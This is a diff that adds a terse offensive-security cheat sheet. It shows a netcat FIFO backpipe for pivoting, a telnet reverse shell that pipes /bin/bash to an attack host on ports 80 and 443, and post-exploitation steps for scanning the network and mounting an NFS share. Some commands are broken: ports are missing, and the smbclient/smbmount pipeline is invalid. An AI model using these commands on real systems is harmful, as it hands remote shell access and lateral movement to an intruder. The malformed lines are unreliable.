@@ -1,0 +1,31 @@
+# alex <alexbujduveanu>
+
+# To make a FIFO in the file system 
+--> mknod [name of file] p
+
+# Pivoting with a backpipe #
+# On the attacker:
+--> nc [pivot host]
+
+# On the pivot host
+--> nc localhost 80 <[FIFO file name] | nc -l -p 4444 >[FIFO file name]
+
+# Telnet variant (when netcat is not available on the target) #
+# Listen on port 80 in terminal 1 on the attack machine
+--> nc -l -n -v -p 80 
+
+# Listen on port 443 in terminal 2 on the attack machine
+--> nc -l -n -v -p 443
+
+# On the target machine:
+--> telnet [attack host] 80 | /bin/bash | telnet [attack host]
+
+Kennedy Sanchez <ksanchez@cldeveloper.com>
+
+[Step by step]
+
+-> Exploiting System
+-> Look for address in the routing table(netstat -rn | arp -a)
+-> Look for services in the found ips(nmap -n -sV [IP])
+-> If found shared folder(NFS) execute (smbclient -L [IP] | smbmount -e [IP])
+-> Mounting the folder (mount -o nolock -t nfs 10.0.0.10:/home/ksanchez /mnt/shared)
